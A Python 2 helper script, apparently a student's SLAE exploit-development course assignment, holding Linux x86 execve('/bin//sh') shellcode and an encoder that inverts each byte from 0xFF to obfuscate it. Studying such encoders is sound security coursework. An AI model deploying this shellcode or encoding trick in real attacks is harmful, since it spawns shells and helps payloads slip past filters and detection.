#!/usr/bin/python

# Student ID  : SLAE-1250
# Student Name: Jonathan "Chops" Crosby
# Assignment 3: Custom Encoder (Linux/x86) Python Helper

# clean shell code for our execve exploit
cleanShellCode = ["31","c0","50","68","2f","2f","73","68","68","2f","62","69","6e","89","e3","50","89","e2","53","89","e1","b0","0b","cd","80"]

#this will hold our final encoded shellcode
finalEncodedShellCode = []

#since we don't have any 0's or FF's in our original shellcode
#we can just subtract the hex from FF to generate a new code
for x in cleanShellCode:
        tmpInt = int("0x" + x, 0)
        newInt = 255 - tmpInt
        newHex = hex(newInt)
        finalEncodedShellCode.append(newHex[2:])

#add final value that will be searched for to terminate on
finalEncodedShellCode.append("ff")

tmpCleanShellCode = ""
for x in cleanShellCode:
        tmpCleanShellCode += "0x" + x + ","

print "Original Execve-Stack Shellcode: \n"
print tmpCleanShellCode[:-1] + "\n\n"
print "--------------------------------\n"

tmpFinalShellcode = ""
for x in finalEncodedShellCode:
        tmpFinalShellcode += "0x" + x + ","

print "Obfuscated Execve-Stack Shellcode: \n"
print tmpFinalShellcode[:-1] + "\n\n"
print "--------------------------------\n"
